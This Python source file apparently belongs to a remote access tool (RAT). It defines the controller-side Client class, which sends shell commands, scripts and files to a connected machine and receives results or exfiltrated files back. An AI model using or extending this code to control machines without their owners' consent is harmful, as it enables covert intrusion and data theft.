import json
import ntpath
import os

from entity.ratsocket import RATSocket
from util.common_util import decode


class Client(RATSocket):

    def __init__(self, s, address, info):
        super().__init__()
        self.socket = s
        self.address = address
        self.info = info

    # 向客户端发送命令
    def send_command(self, command: str, command_type='command'):
        body = command.encode()
        head = {
            'type': command_type,
            'length': len(body)
        }
        self.send(head, body)

    # 向客户端发送脚本
    def send_script(self, filename: str, args: dict):
        with open(filename, 'rb') as file:
            body = file.read()
        head = {
            'type': 'script',
            'args': json.dumps(args),
            'length': len(body)
        }
        self.send(head, body)

    # 向客户端发送文件
    def send_file(self, filename: str):
        head = {
            'type': 'file',
            'filename': ntpath.basename(filename),
            'length': os.stat(filename).st_size
        }
        with open(filename, 'rb') as file:
            self.send(head, file.read())

    # 从客户端接收执行结果或文件
    def recv_result(self):
        head, body = self.recv()
        if head['type'] == 'result':
            return head['status'], decode(body)
        elif head['type'] == 'file':
            try:
                with open(head['filename'], 'wb') as file:
                    file.write(body)
                return 1, 'File saved to: {}'.format(os.path.abspath(head['filename']))
            except Exception as e:
                return 0, str(e)
